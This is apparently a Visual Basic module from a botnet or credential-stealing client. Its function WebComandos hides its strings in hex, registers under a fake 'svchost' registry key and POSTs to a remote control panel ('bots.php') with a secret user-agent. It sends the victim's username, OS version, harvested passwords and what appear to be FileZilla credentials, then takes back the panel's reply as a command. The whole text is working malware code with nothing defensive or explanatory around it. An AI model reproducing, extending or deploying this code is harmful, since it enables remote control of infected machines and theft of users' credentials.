Attribute VB_Name = "EnterData"
Public Function WebComandos(ByVal WebPanel) 'Get Latest Command
On Error Resume Next

Dim objHttp As Object, strURL As String, strText As String, id As String
Dim DatosBots As String
id = GetSetting("svchost", "svchost", "id", strText) 'Get ID

strURL = WebPanel & Desencriptar("626F74732E706870") 'Control WebPanel / run.php
Set objHttp = CreateObject("MSXML2.ServerXMLHTTP")
objHttp.Open "POST", strURL, False
objHttp.setRequestHeader "User-Agent", _
    "753cda8b05e32ef3b82e0ff947a4a936" 'Set user-agent [Secret MD5]
objHttp.setRequestHeader "Content-Type", _
    "application/x-www-form-urlencoded" 'Allows data to be sent
    
DatosBots = Desencriptar("6E616D653D") & UnameWin32() & Desencriptar("26736F3D") & VersionToName(NativeGetVersion) & Desencriptar("26706173773D") & iLogSn() & Desencriptar("2666696C653D") & DualXmlZila()

objHttp.Send (DatosBots) 'Send ID


strText = objHttp.ResponseText 'Response Text

Set objHttp = Nothing

WebComandos = strText
End Function


